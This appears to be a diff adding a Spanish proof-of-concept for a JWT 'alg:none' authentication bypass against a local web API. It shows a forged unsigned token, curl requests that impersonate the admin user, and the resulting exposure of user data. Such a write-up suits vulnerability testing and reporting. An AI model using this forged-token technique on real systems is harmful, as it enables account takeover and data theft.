@@ -1,0 +1,32 @@
+################################################################
+# PoC API2:2023 - BROKEN AUTHENTICATION (JWT alg:none)
+# Middleware de sesion   |   Estado: VULNERABLE
+################################################################
+
+## El servidor elige el algoritmo segun la cabecera del token (alg-confusion).
+## Un atacante forja un token con alg:none, SIN conocer la clave secreta.
+
+## Paso 1. Forjar el token (header alg:none, payload user.id=1 = admin)
+   header  = {"alg":"none","typ":"JWT"}
+   payload = {"user":{"id":1}}
+   firma   = (vacia)
+   token   = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjp7ImlkIjoxfX0.
+
+## Paso 2. Usar el token forjado contra /user (identidad suplantada)
+$ curl 'http://localhost:3000/api/user' -H 'Authorization: Token eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjp7ImlkIjoxfX0.'
+{
+    "user": {
+        "id": 1,
+        "email": "francisco-javier+wafula336@qq.dev",
+        "username": "Eliyahu Jim\u00e9nez",
+        "bio": null,
+        "image": "https://api.realworld.io/images/demo-avatar.png",
+        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoxfSwiaWF0IjoxNzg4NzQ4MDMwLCJleHAiOjE3OTM5MzIwMzB9.Fzm9os49DxcfA3lkJmL7O-459EIEzq6OFSQWRYHcpbA"
+    }
+}
+
+## Paso 3. Usar el token forjado contra el panel admin
+$ curl 'http://localhost:3000/api/admin/users' -H 'Authorization: Token <token-forjado>'
+   Acceso concedido. Usuarios expuestos: 13
+
+## Resultado: suplantacion total de identidad (incluido admin) sin la clave.
